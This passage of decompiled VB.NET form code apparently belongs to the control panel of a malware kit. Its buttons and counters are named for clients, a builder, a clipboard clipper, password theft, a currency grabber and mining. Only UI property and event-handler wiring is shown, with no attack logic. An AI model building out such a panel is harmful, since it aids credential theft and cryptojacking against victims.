				Dim value2 As EventHandler = AddressOf Me.TapHome_Click
				Dim tapHome As UIImageButton = Me._TapHome
				If tapHome IsNot Nothing Then
					RemoveHandler tapHome.Click, value2
				End If
				Me._TapHome = value
				tapHome = Me._TapHome
				If tapHome IsNot Nothing Then
					AddHandler tapHome.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004A5 RID: 1189
		' (get) Token: 0x06000B31 RID: 2865 RVA: 0x0006E99F File Offset: 0x0006CB9F
		' (set) Token: 0x06000B32 RID: 2866 RVA: 0x0006E9AC File Offset: 0x0006CBAC
		Friend Overridable Property TapClients As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapClients
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapClients_Click
				Dim tapClients As UIImageButton = Me._TapClients
				If tapClients IsNot Nothing Then
					RemoveHandler tapClients.Click, value2
				End If
				Me._TapClients = value
				tapClients = Me._TapClients
				If tapClients IsNot Nothing Then
					AddHandler tapClients.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004A6 RID: 1190
		' (get) Token: 0x06000B33 RID: 2867 RVA: 0x0006E9EF File Offset: 0x0006CBEF
		' (set) Token: 0x06000B34 RID: 2868 RVA: 0x0006E9FC File Offset: 0x0006CBFC
		Friend Overridable Property TapClientsMonitor As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapClientsMonitor
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapClientsMonitor_Click
				Dim tapClientsMonitor As UIImageButton = Me._TapClientsMonitor
				If tapClientsMonitor IsNot Nothing Then
					RemoveHandler tapClientsMonitor.Click, value2
				End If
				Me._TapClientsMonitor = value
				tapClientsMonitor = Me._TapClientsMonitor
				If tapClientsMonitor IsNot Nothing Then
					AddHandler tapClientsMonitor.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004A7 RID: 1191
		' (get) Token: 0x06000B35 RID: 2869 RVA: 0x0006EA3F File Offset: 0x0006CC3F
		' (set) Token: 0x06000B36 RID: 2870 RVA: 0x0006EA4C File Offset: 0x0006CC4C
		Friend Overridable Property TapMining As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapMining
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapMining_Click
				Dim tapMining As UIImageButton = Me._TapMining
				If tapMining IsNot Nothing Then
					RemoveHandler tapMining.Click, value2
				End If
				Me._TapMining = value
				tapMining = Me._TapMining
				If tapMining IsNot Nothing Then
					AddHandler tapMining.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004A8 RID: 1192
		' (get) Token: 0x06000B37 RID: 2871 RVA: 0x0006EA8F File Offset: 0x0006CC8F
		' (set) Token: 0x06000B38 RID: 2872 RVA: 0x0006EA9C File Offset: 0x0006CC9C
		Friend Overridable Property TapClipper As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapClipper
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapClipper_Click
				Dim tapClipper As UIImageButton = Me._TapClipper
				If tapClipper IsNot Nothing Then
					RemoveHandler tapClipper.Click, value2
				End If
				Me._TapClipper = value
				tapClipper = Me._TapClipper
				If tapClipper IsNot Nothing Then
					AddHandler tapClipper.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004A9 RID: 1193
		' (get) Token: 0x06000B39 RID: 2873 RVA: 0x0006EADF File Offset: 0x0006CCDF
		' (set) Token: 0x06000B3A RID: 2874 RVA: 0x0006EAEC File Offset: 0x0006CCEC
		Friend Overridable Property TapPasswords As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapPasswords
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapPasswords_Click
				Dim tapPasswords As UIImageButton = Me._TapPasswords
				If tapPasswords IsNot Nothing Then
					RemoveHandler tapPasswords.Click, value2
				End If
				Me._TapPasswords = value
				tapPasswords = Me._TapPasswords
				If tapPasswords IsNot Nothing Then
					AddHandler tapPasswords.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004AA RID: 1194
		' (get) Token: 0x06000B3B RID: 2875 RVA: 0x0006EB2F File Offset: 0x0006CD2F
		' (set) Token: 0x06000B3C RID: 2876 RVA: 0x0006EB3C File Offset: 0x0006CD3C
		Friend Overridable Property TapBuilder As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapBuilder
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapBuilder_Click
				Dim tapBuilder As UIImageButton = Me._TapBuilder
				If tapBuilder IsNot Nothing Then
					RemoveHandler tapBuilder.Click, value2
				End If
				Me._TapBuilder = value
				tapBuilder = Me._TapBuilder
				If tapBuilder IsNot Nothing Then
					AddHandler tapBuilder.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004AB RID: 1195
		' (get) Token: 0x06000B3D RID: 2877 RVA: 0x0006EB7F File Offset: 0x0006CD7F
		' (set) Token: 0x06000B3E RID: 2878 RVA: 0x0006EB8C File Offset: 0x0006CD8C
		Friend Overridable Property TapPortSettings As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapPortSettings
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapTools_Click
				Dim tapPortSettings As UIImageButton = Me._TapPortSettings
				If tapPortSettings IsNot Nothing Then
					RemoveHandler tapPortSettings.Click, value2
				End If
				Me._TapPortSettings = value
				tapPortSettings = Me._TapPortSettings
				If tapPortSettings IsNot Nothing Then
					AddHandler tapPortSettings.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004AC RID: 1196
		' (get) Token: 0x06000B3F RID: 2879 RVA: 0x0006EBCF File Offset: 0x0006CDCF
		' (set) Token: 0x06000B40 RID: 2880 RVA: 0x0006EBDC File Offset: 0x0006CDDC
		Friend Overridable Property TapAbout As UIImageButton
			<CompilerGenerated()>
			Get
				Return Me._TapAbout
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UIImageButton)
				Dim value2 As EventHandler = AddressOf Me.TapAbout_Click
				Dim tapAbout As UIImageButton = Me._TapAbout
				If tapAbout IsNot Nothing Then
					RemoveHandler tapAbout.Click, value2
				End If
				Me._TapAbout = value
				tapAbout = Me._TapAbout
				If tapAbout IsNot Nothing Then
					AddHandler tapAbout.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170004AD RID: 1197
		' (get) Token: 0x06000B41 RID: 2881 RVA: 0x0006EC1F File Offset: 0x0006CE1F
		' (set) Token: 0x06000B42 RID: 2882 RVA: 0x0006EC29 File Offset: 0x0006CE29
		Friend Overridable Property Guna2CustomGradientPanel2 As Guna2CustomGradientPanel

		' Token: 0x170004AE RID: 1198
		' (get) Token: 0x06000B43 RID: 2883 RVA: 0x0006EC32 File Offset: 0x0006CE32
		' (set) Token: 0x06000B44 RID: 2884 RVA: 0x0006EC3C File Offset: 0x0006CE3C
		Friend Overridable Property PanelCertificate As System.Windows.Forms.PictureBox

		' Token: 0x170004AF RID: 1199
		' (get) Token: 0x06000B45 RID: 2885 RVA: 0x0006EC45 File Offset: 0x0006CE45
		' (set) Token: 0x06000B46 RID: 2886 RVA: 0x0006EC4F File Offset: 0x0006CE4F
		Friend Overridable Property Guna2ImageButton1 As Guna2ImageButton

		' Token: 0x170004B0 RID: 1200
		' (get) Token: 0x06000B47 RID: 2887 RVA: 0x0006EC58 File Offset: 0x0006CE58
		' (set) Token: 0x06000B48 RID: 2888 RVA: 0x0006EC62 File Offset: 0x0006CE62
		Friend Overridable Property NamePage1 As UILabel

		' Token: 0x170004B1 RID: 1201
		' (get) Token: 0x06000B49 RID: 2889 RVA: 0x0006EC6B File Offset: 0x0006CE6B
		' (set) Token: 0x06000B4A RID: 2890 RVA: 0x0006EC75 File Offset: 0x0006CE75
		Friend Overridable Property PathPage As UILabel

		' Token: 0x170004B2 RID: 1202
		' (get) Token: 0x06000B4B RID: 2891 RVA: 0x0006EC7E File Offset: 0x0006CE7E
		' (set) Token: 0x06000B4C RID: 2892 RVA: 0x0006EC88 File Offset: 0x0006CE88
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x170004B3 RID: 1203
		' (get) Token: 0x06000B4D RID: 2893 RVA: 0x0006EC91 File Offset: 0x0006CE91
		' (set) Token: 0x06000B4E RID: 2894 RVA: 0x0006EC9B File Offset: 0x0006CE9B
		Friend Overridable Property Guna2CustomGradientPanel1 As Guna2CustomGradientPanel

		' Token: 0x170004B4 RID: 1204
		' (get) Token: 0x06000B4F RID: 2895 RVA: 0x0006ECA4 File Offset: 0x0006CEA4
		' (set) Token: 0x06000B50 RID: 2896 RVA: 0x0006ECAE File Offset: 0x0006CEAE
		Friend Overridable Property HomePanelDataReceived As Guna2GradientPanel

		' Token: 0x170004B5 RID: 1205
		' (get) Token: 0x06000B51 RID: 2897 RVA: 0x0006ECB7 File Offset: 0x0006CEB7
		' (set) Token: 0x06000B52 RID: 2898 RVA: 0x0006ECC1 File Offset: 0x0006CEC1
		Friend Overridable Property PictureBox69 As System.Windows.Forms.PictureBox

		' Token: 0x170004B6 RID: 1206
		' (get) Token: 0x06000B53 RID: 2899 RVA: 0x0006ECCA File Offset: 0x0006CECA
		' (set) Token: 0x06000B54 RID: 2900 RVA: 0x0006ECD4 File Offset: 0x0006CED4
		Friend Overridable Property NumOutReceivedData As UILabel

		' Token: 0x170004B7 RID: 1207
		' (get) Token: 0x06000B55 RID: 2901 RVA: 0x0006ECDD File Offset: 0x0006CEDD
		' (set) Token: 0x06000B56 RID: 2902 RVA: 0x0006ECE7 File Offset: 0x0006CEE7
		Friend Overridable Property NumReceviedData As UILabel

		' Token: 0x170004B8 RID: 1208
		' (get) Token: 0x06000B57 RID: 2903 RVA: 0x0006ECF0 File Offset: 0x0006CEF0
		' (set) Token: 0x06000B58 RID: 2904 RVA: 0x0006ECFA File Offset: 0x0006CEFA
		Friend Overridable Property UiLabel12 As UILabel

		' Token: 0x170004B9 RID: 1209
		' (get) Token: 0x06000B59 RID: 2905 RVA: 0x0006ED03 File Offset: 0x0006CF03
		' (set) Token: 0x06000B5A RID: 2906 RVA: 0x0006ED0D File Offset: 0x0006CF0D
		Friend Overridable Property HomePanelDataSent As Guna2GradientPanel

		' Token: 0x170004BA RID: 1210
		' (get) Token: 0x06000B5B RID: 2907 RVA: 0x0006ED16 File Offset: 0x0006CF16
		' (set) Token: 0x06000B5C RID: 2908 RVA: 0x0006ED20 File Offset: 0x0006CF20
		Friend Overridable Property PictureBox68 As System.Windows.Forms.PictureBox

		' Token: 0x170004BB RID: 1211
		' (get) Token: 0x06000B5D RID: 2909 RVA: 0x0006ED29 File Offset: 0x0006CF29
		' (set) Token: 0x06000B5E RID: 2910 RVA: 0x0006ED33 File Offset: 0x0006CF33
		Friend Overridable Property NumOutData As UILabel

		' Token: 0x170004BC RID: 1212
		' (get) Token: 0x06000B5F RID: 2911 RVA: 0x0006ED3C File Offset: 0x0006CF3C
		' (set) Token: 0x06000B60 RID: 2912 RVA: 0x0006ED46 File Offset: 0x0006CF46
		Friend Overridable Property numSentData As UILabel

		' Token: 0x170004BD RID: 1213
		' (get) Token: 0x06000B61 RID: 2913 RVA: 0x0006ED4F File Offset: 0x0006CF4F
		' (set) Token: 0x06000B62 RID: 2914 RVA: 0x0006ED59 File Offset: 0x0006CF59
		Friend Overridable Property UiLabel9 As UILabel

		' Token: 0x170004BE RID: 1214
		' (get) Token: 0x06000B63 RID: 2915 RVA: 0x0006ED62 File Offset: 0x0006CF62
		' (set) Token: 0x06000B64 RID: 2916 RVA: 0x0006ED6C File Offset: 0x0006CF6C
		Friend Overridable Property HomePanelConnected As Guna2GradientPanel

		' Token: 0x170004BF RID: 1215
		' (get) Token: 0x06000B65 RID: 2917 RVA: 0x0006ED75 File Offset: 0x0006CF75
		' (set) Token: 0x06000B66 RID: 2918 RVA: 0x0006ED7F File Offset: 0x0006CF7F
		Friend Overridable Property PictureBox67 As System.Windows.Forms.PictureBox

		' Token: 0x170004C0 RID: 1216
		' (get) Token: 0x06000B67 RID: 2919 RVA: 0x0006ED88 File Offset: 0x0006CF88
		' (set) Token: 0x06000B68 RID: 2920 RVA: 0x0006ED92 File Offset: 0x0006CF92
		Friend Overridable Property numOutOnlien As UILabel

		' Token: 0x170004C1 RID: 1217
		' (get) Token: 0x06000B69 RID: 2921 RVA: 0x0006ED9B File Offset: 0x0006CF9B
		' (set) Token: 0x06000B6A RID: 2922 RVA: 0x0006EDA5 File Offset: 0x0006CFA5
		Friend Overridable Property NumOnlien As UILabel

		' Token: 0x170004C2 RID: 1218
		' (get) Token: 0x06000B6B RID: 2923 RVA: 0x0006EDAE File Offset: 0x0006CFAE
		' (set) Token: 0x06000B6C RID: 2924 RVA: 0x0006EDB8 File Offset: 0x0006CFB8
		Friend Overridable Property UiLabel4 As UILabel

		' Token: 0x170004C3 RID: 1219
		' (get) Token: 0x06000B6D RID: 2925 RVA: 0x0006EDC1 File Offset: 0x0006CFC1
		' (set) Token: 0x06000B6E RID: 2926 RVA: 0x0006EDCB File Offset: 0x0006CFCB
		Friend Overridable Property HomePanelMAP As Guna2CustomGradientPanel

		' Token: 0x170004C4 RID: 1220
		' (get) Token: 0x06000B6F RID: 2927 RVA: 0x0006EDD4 File Offset: 0x0006CFD4
		' (set) Token: 0x06000B70 RID: 2928 RVA: 0x0006EDDE File Offset: 0x0006CFDE
		Friend Overridable Property HomePanelLogs As Guna2CustomGradientPanel

		' Token: 0x170004C5 RID: 1221
		' (get) Token: 0x06000B71 RID: 2929 RVA: 0x0006EDE7 File Offset: 0x0006CFE7
		' (set) Token: 0x06000B72 RID: 2930 RVA: 0x0006EDF1 File Offset: 0x0006CFF1
		Friend Overridable Property UiLabel7 As UILabel

		' Token: 0x170004C6 RID: 1222
		' (get) Token: 0x06000B73 RID: 2931 RVA: 0x0006EDFA File Offset: 0x0006CFFA
		' (set) Token: 0x06000B74 RID: 2932 RVA: 0x0006EE04 File Offset: 0x0006D004
		Friend Overridable Property UiLabel6 As UILabel

		' Token: 0x170004C7 RID: 1223
		' (get) Token: 0x06000B75 RID: 2933 RVA: 0x0006EE0D File Offset: 0x0006D00D
		' (set) Token: 0x06000B76 RID: 2934 RVA: 0x0006EE17 File Offset: 0x0006D017
		Friend Overridable Property UiLabel5 As UILabel

		' Token: 0x170004C8 RID: 1224
		' (get) Token: 0x06000B77 RID: 2935 RVA: 0x0006EE20 File Offset: 0x0006D020
		' (set) Token: 0x06000B78 RID: 2936 RVA: 0x0006EE2A File Offset: 0x0006D02A
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x170004C9 RID: 1225
		' (get) Token: 0x06000B79 RID: 2937 RVA: 0x0006EE33 File Offset: 0x0006D033
		' (set) Token: 0x06000B7A RID: 2938 RVA: 0x0006EE3D File Offset: 0x0006D03D
		Friend Overridable Property HomePanelSystems As Guna2CustomGradientPanel

		' Token: 0x170004CA RID: 1226
		' (get) Token: 0x06000B7B RID: 2939 RVA: 0x0006EE46 File Offset: 0x0006D046
		' (set) Token: 0x06000B7C RID: 2940 RVA: 0x0006EE50 File Offset: 0x0006D050
		Friend Overridable Property UiLabel19 As UILabel

		' Token: 0x170004CB RID: 1227
		' (get) Token: 0x06000B7D RID: 2941 RVA: 0x0006EE59 File Offset: 0x0006D059
		' (set) Token: 0x06000B7E RID: 2942 RVA: 0x0006EE63 File Offset: 0x0006D063
		Friend Overridable Property UiLabel18 As UILabel

		' Token: 0x170004CC RID: 1228
		' (get) Token: 0x06000B7F RID: 2943 RVA: 0x0006EE6C File Offset: 0x0006D06C
		' (set) Token: 0x06000B80 RID: 2944 RVA: 0x0006EE76 File Offset: 0x0006D076
		Friend Overridable Property UiLabel17 As UILabel

		' Token: 0x170004CD RID: 1229
		' (get) Token: 0x06000B81 RID: 2945 RVA: 0x0006EE7F File Offset: 0x0006D07F
		' (set) Token: 0x06000B82 RID: 2946 RVA: 0x0006EE89 File Offset: 0x0006D089
		Friend Overridable Property UiLabel16 As UILabel

		' Token: 0x170004CE RID: 1230
		' (get) Token: 0x06000B83 RID: 2947 RVA: 0x0006EE92 File Offset: 0x0006D092
		' (set) Token: 0x06000B84 RID: 2948 RVA: 0x0006EE9C File Offset: 0x0006D09C
		Friend Overridable Property UiLabel15 As UILabel

		' Token: 0x170004CF RID: 1231
		' (get) Token: 0x06000B85 RID: 2949 RVA: 0x0006EEA5 File Offset: 0x0006D0A5
		' (set) Token: 0x06000B86 RID: 2950 RVA: 0x0006EEAF File Offset: 0x0006D0AF
		Friend Overridable Property UiLabel14 As UILabel

		' Token: 0x170004D0 RID: 1232
		' (get) Token: 0x06000B87 RID: 2951 RVA: 0x0006EEB8 File Offset: 0x0006D0B8
		' (set) Token: 0x06000B88 RID: 2952 RVA: 0x0006EEC2 File Offset: 0x0006D0C2
		Friend Overridable Property PictureBox70 As System.Windows.Forms.PictureBox

		' Token: 0x170004D1 RID: 1233
		' (get) Token: 0x06000B89 RID: 2953 RVA: 0x0006EECB File Offset: 0x0006D0CB
		' (set) Token: 0x06000B8A RID: 2954 RVA: 0x0006EED5 File Offset: 0x0006D0D5
		Friend Overridable Property PictureBox51 As System.Windows.Forms.PictureBox

		' Token: 0x170004D2 RID: 1234
		' (get) Token: 0x06000B8B RID: 2955 RVA: 0x0006EEDE File Offset: 0x0006D0DE
		' (set) Token: 0x06000B8C RID: 2956 RVA: 0x0006EEE8 File Offset: 0x0006D0E8
		Friend Overridable Property PictureBox43 As System.Windows.Forms.PictureBox

		' Token: 0x170004D3 RID: 1235
		' (get) Token: 0x06000B8D RID: 2957 RVA: 0x0006EEF1 File Offset: 0x0006D0F1
		' (set) Token: 0x06000B8E RID: 2958 RVA: 0x0006EEFB File Offset: 0x0006D0FB
		Friend Overridable Property PictureBox8 As System.Windows.Forms.PictureBox

		' Token: 0x170004D4 RID: 1236
		' (get) Token: 0x06000B8F RID: 2959 RVA: 0x0006EF04 File Offset: 0x0006D104
		' (set) Token: 0x06000B90 RID: 2960 RVA: 0x0006EF0E File Offset: 0x0006D10E
		Friend Overridable Property NumWizndows11 As UILabel

		' Token: 0x170004D5 RID: 1237
		' (get) Token: 0x06000B91 RID: 2961 RVA: 0x0006EF17 File Offset: 0x0006D117
		' (set) Token: 0x06000B92 RID: 2962 RVA: 0x0006EF21 File Offset: 0x0006D121
		Friend Overridable Property NumWzindows10 As UILabel

		' Token: 0x170004D6 RID: 1238
		' (get) Token: 0x06000B93 RID: 2963 RVA: 0x0006EF2A File Offset: 0x0006D12A
		' (set) Token: 0x06000B94 RID: 2964 RVA: 0x0006EF34 File Offset: 0x0006D134
		Friend Overridable Property NumWizndows8 As UILabel

		' Token: 0x170004D7 RID: 1239
		' (get) Token: 0x06000B95 RID: 2965 RVA: 0x0006EF3D File Offset: 0x0006D13D
		' (set) Token: 0x06000B96 RID: 2966 RVA: 0x0006EF47 File Offset: 0x0006D147
		Friend Overridable Property NumWizndowsXpAnd7 As UILabel

		' Token: 0x170004D8 RID: 1240
		' (get) Token: 0x06000B97 RID: 2967 RVA: 0x0006EF50 File Offset: 0x0006D150
		' (set) Token: 0x06000B98 RID: 2968 RVA: 0x0006EF5A File Offset: 0x0006D15A
		Friend Overridable Property ProgressBarWizndows11 As Guna2ProgressBar

		' Token: 0x170004D9 RID: 1241
		' (get) Token: 0x06000B99 RID: 2969 RVA: 0x0006EF63 File Offset: 0x0006D163
		' (set) Token: 0x06000B9A RID: 2970 RVA: 0x0006EF6D File Offset: 0x0006D16D
		Friend Overridable Property ProgressBarWizndows10 As Guna2ProgressBar

		' Token: 0x170004DA RID: 1242
		' (get) Token: 0x06000B9B RID: 2971 RVA: 0x0006EF76 File Offset: 0x0006D176
		' (set) Token: 0x06000B9C RID: 2972 RVA: 0x0006EF80 File Offset: 0x0006D180
		Friend Overridable Property ProgressBarWizndows8 As Guna2ProgressBar

		' Token: 0x170004DB RID: 1243
		' (get) Token: 0x06000B9D RID: 2973 RVA: 0x0006EF89 File Offset: 0x0006D189
		' (set) Token: 0x06000B9E RID: 2974 RVA: 0x0006EF93 File Offset: 0x0006D193
		Friend Overridable Property ProgressBarWizndowsXPAnd7 As Guna2ProgressBar

		' Token: 0x170004DC RID: 1244
		' (get) Token: 0x06000B9F RID: 2975 RVA: 0x0006EF9C File Offset: 0x0006D19C
		' (set) Token: 0x06000BA0 RID: 2976 RVA: 0x0006EFA6 File Offset: 0x0006D1A6
		Friend Overridable Property UiLabel20 As UILabel

		' Token: 0x170004DD RID: 1245
		' (get) Token: 0x06000BA1 RID: 2977 RVA: 0x0006EFAF File Offset: 0x0006D1AF
		' (set) Token: 0x06000BA2 RID: 2978 RVA: 0x0006EFB9 File Offset: 0x0006D1B9
		Friend Overridable Property PictureBox1 As System.Windows.Forms.PictureBox

		' Token: 0x170004DE RID: 1246
		' (get) Token: 0x06000BA3 RID: 2979 RVA: 0x0006EFC2 File Offset: 0x0006D1C2
		' (set) Token: 0x06000BA4 RID: 2980 RVA: 0x0006EFCC File Offset: 0x0006D1CC
		Friend Overridable Property HomeHartSize As Guna2GradientPanel

		' Token: 0x170004DF RID: 1247
		' (get) Token: 0x06000BA5 RID: 2981 RVA: 0x0006EFD5 File Offset: 0x0006D1D5
		' (set) Token: 0x06000BA6 RID: 2982 RVA: 0x0006EFDF File Offset: 0x0006D1DF
		Friend Overridable Property NumsizeDatas As UILabel

		' Token: 0x170004E0 RID: 1248
		' (get) Token: 0x06000BA7 RID: 2983 RVA: 0x0006EFE8 File Offset: 0x0006D1E8
		' (set) Token: 0x06000BA8 RID: 2984 RVA: 0x0006EFF2 File Offset: 0x0006D1F2
		Friend Overridable Property NumSizeData As UILabel

		' Token: 0x170004E1 RID: 1249
		' (get) Token: 0x06000BA9 RID: 2985 RVA: 0x0006EFFB File Offset: 0x0006D1FB
		' (set) Token: 0x06000BAA RID: 2986 RVA: 0x0006F005 File Offset: 0x0006D205
		Friend Overridable Property PictureBox44 As System.Windows.Forms.PictureBox

		' Token: 0x170004E2 RID: 1250
		' (get) Token: 0x06000BAB RID: 2987 RVA: 0x0006F00E File Offset: 0x0006D20E
		' (set) Token: 0x06000BAC RID: 2988 RVA: 0x0006F018 File Offset: 0x0006D218
		Friend Overridable Property UiLabel21 As UILabel

		' Token: 0x170004E3 RID: 1251
		' (get) Token: 0x06000BAD RID: 2989 RVA: 0x0006F021 File Offset: 0x0006D221
		' (set) Token: 0x06000BAE RID: 2990 RVA: 0x0006F02B File Offset: 0x0006D22B
		Friend Overridable Property NumAllSystem As UILabel

		' Token: 0x170004E4 RID: 1252
		' (get) Token: 0x06000BAF RID: 2991 RVA: 0x0006F034 File Offset: 0x0006D234
		' (set) Token: 0x06000BB0 RID: 2992 RVA: 0x0006F03E File Offset: 0x0006D23E
		Friend Overridable Property HomePanelStatistics As Guna2CustomGradientPanel

		' Token: 0x170004E5 RID: 1253
		' (get) Token: 0x06000BB1 RID: 2993 RVA: 0x0006F047 File Offset: 0x0006D247
		' (set) Token: 0x06000BB2 RID: 2994 RVA: 0x0006F051 File Offset: 0x0006D251
		Friend Overridable Property PictureBox4 As System.Windows.Forms.PictureBox

		' Token: 0x170004E6 RID: 1254
		' (get) Token: 0x06000BB3 RID: 2995 RVA: 0x0006F05A File Offset: 0x0006D25A
		' (set) Token: 0x06000BB4 RID: 2996 RVA: 0x0006F064 File Offset: 0x0006D264
		Friend Overridable Property PictureBox3 As System.Windows.Forms.PictureBox

		' Token: 0x170004E7 RID: 1255
		' (get) Token: 0x06000BB5 RID: 2997 RVA: 0x0006F06D File Offset: 0x0006D26D
		' (set) Token: 0x06000BB6 RID: 2998 RVA: 0x0006F077 File Offset: 0x0006D277
		Friend Overridable Property PictureBox2 As System.Windows.Forms.PictureBox

		' Token: 0x170004E8 RID: 1256
		' (get) Token: 0x06000BB7 RID: 2999 RVA: 0x0006F080 File Offset: 0x0006D280
		' (set) Token: 0x06000BB8 RID: 3000 RVA: 0x0006F08A File Offset: 0x0006D28A
		Friend Overridable Property UiLabel29 As UILabel

		' Token: 0x170004E9 RID: 1257
		' (get) Token: 0x06000BB9 RID: 3001 RVA: 0x0006F093 File Offset: 0x0006D293
		' (set) Token: 0x06000BBA RID: 3002 RVA: 0x0006F09D File Offset: 0x0006D29D
		Friend Overridable Property UiLabel28 As UILabel

		' Token: 0x170004EA RID: 1258
		' (get) Token: 0x06000BBB RID: 3003 RVA: 0x0006F0A6 File Offset: 0x0006D2A6
		' (set) Token: 0x06000BBC RID: 3004 RVA: 0x0006F0B0 File Offset: 0x0006D2B0
		Friend Overridable Property UiLabel27 As UILabel

		' Token: 0x170004EB RID: 1259
		' (get) Token: 0x06000BBD RID: 3005 RVA: 0x0006F0B9 File Offset: 0x0006D2B9
		' (set) Token: 0x06000BBE RID: 3006 RVA: 0x0006F0C3 File Offset: 0x0006D2C3
		Friend Overridable Property NumListPasswords As UILabel

		' Token: 0x170004EC RID: 1260
		' (get) Token: 0x06000BBF RID: 3007 RVA: 0x0006F0CC File Offset: 0x0006D2CC
		' (set) Token: 0x06000BC0 RID: 3008 RVA: 0x0006F0D6 File Offset: 0x0006D2D6
		Friend Overridable Property NumListCurrencyGrabber As UILabel

		' Token: 0x170004ED RID: 1261
		' (get) Token: 0x06000BC1 RID: 3009 RVA: 0x0006F0DF File Offset: 0x0006D2DF
		' (set) Token: 0x06000BC2 RID: 3010 RVA: 0x0006F0E9 File Offset: 0x0006D2E9
		Friend Overridable Property NumListMining As UILabel

		' Token: 0x170004EE RID: 1262
		' (get) Token: 0x06000BC3 RID: 3011 RVA: 0x0006F0F2 File Offset: 0x0006D2F2
		' (set) Token: 0x06000BC4 RID: 3012 RVA: 0x0006F0FC File Offset: 0x0006D2FC
		Friend Overridable Property UiLabel8 As UILabel

		' Token: 0x170004EF RID: 1263
		' (get) Token: 0x06000BC5 RID: 3013 RVA: 0x0006F105 File Offset: 0x0006D305
		' (set) Token: 0x06000BC6 RID: 3014 RVA: 0x0006F10F File Offset: 0x0006D30F
		Friend Overridable Property UiLabel22 As UILabel

		' Token: 0x170004F0 RID: 1264
		' (get) Token: 0x06000BC7 RID: 3015 RVA: 0x0006F118 File Offset: 0x0006D318
		' (set) Token: 0x06000BC8 RID: 3016 RVA: 0x0006F122 File Offset: 0x0006D322
		Friend Overridable Property UiLabel23 As UILabel

		' Token: 0x170004F1 RID: 1265
		' (get) Token: 0x06000BC9 RID: 3017 RVA: 0x0006F12B File Offset: 0x0006D32B
		' (set) Token: 0x06000BCA RID: 3018 RVA: 0x0006F135 File Offset: 0x0006D335
		Friend Overridable Property Guna2CustomGradientPanel5 As Guna2CustomGradientPanel

		' Token: 0x170004F2 RID: 1266
		' (get) Token: 0x06000BCB RID: 3019 RVA: 0x0006F13E File Offset: 0x0006D33E
		' (set) Token: 0x06000BCC RID: 3020 RVA: 0x0006F148 File Offset: 0x0006D348
		Friend Overridable Property ElipseListClientL1 As Guna2Elipse

		' Token: 0x170004F3 RID: 1267
		' (get) Token: 0x06000BCD RID: 3021 RVA: 0x0006F151 File Offset: 0x0006D351
		' (set) Token: 0x06000BCE RID: 3022 RVA: 0x0006F15B File Offset: 0x0006D35B
		Friend Overridable Property Guna2CustomGradientPanel6 As Guna2CustomGradientPanel

		' Token: 0x170004F4 RID: 1268
		' (get) Token: 0x06000BCF RID: 3023 RVA: 0x0006F164 File Offset: 0x0006D364
		' (set) Token: 0x06000BD0 RID: 3024 RVA: 0x0006F16E File Offset: 0x0006D36E
		Friend Overridable Property Guna2CustomGradientPanel7 As Guna2CustomGradientPanel

		' Token: 0x170004F5 RID: 1269
		' (get) Token: 0x06000BD1 RID: 3025 RVA: 0x0006F177 File Offset: 0x0006D377
		' (set) Token: 0x06000BD2 RID: 3026 RVA: 0x0006F181 File Offset: 0x0006D381
		Friend Overridable Property Guna2CustomGradientPanel8 As Guna2CustomGradientPanel

		' Token: 0x170004F6 RID: 1270
		' (get) Token: 0x06000BD3 RID: 3027 RVA: 0x0006F18A File Offset: 0x0006D38A
		' (set) Token: 0x06000BD4 RID: 3028 RVA: 0x0006F194 File Offset: 0x0006D394
		Friend Overridable Property Guna2CustomGradientPanel4 As Guna2CustomGradientPanel

		' Token: 0x170004F7 RID: 1271
		' (get) Token: 0x06000BD5 RID: 3029 RVA: 0x0006F19D File Offset: 0x0006D39D
		' (set) Token: 0x06000BD6 RID: 3030 RVA: 0x0006F1A7 File Offset: 0x0006D3A7
		Friend Overridable Property ElipseListClientsLogsE As Guna2Elipse

		' Token: 0x170004F8 RID: 1272
		' (get) Token: 0x06000BD7 RID: 3031 RVA: 0x0006F1B0 File Offset: 0x0006D3B0
		' (set) Token: 0x06000BD8 RID: 3032 RVA: 0x0006F1BA File Offset: 0x0006D3BA
		Friend Overridable Property ElipseListMiningW As Guna2Elipse

		' Token: 0x170004F9 RID: 1273
		' (get) Token: 0x06000BD9 RID: 3033 RVA: 0x0006F1C3 File Offset: 0x0006D3C3
		' (set) Token: 0x06000BDA RID: 3034 RVA: 0x0006F1CD File Offset: 0x0006D3CD
		Friend Overridable Property ElipseCurrencyL1D As Guna2Elipse

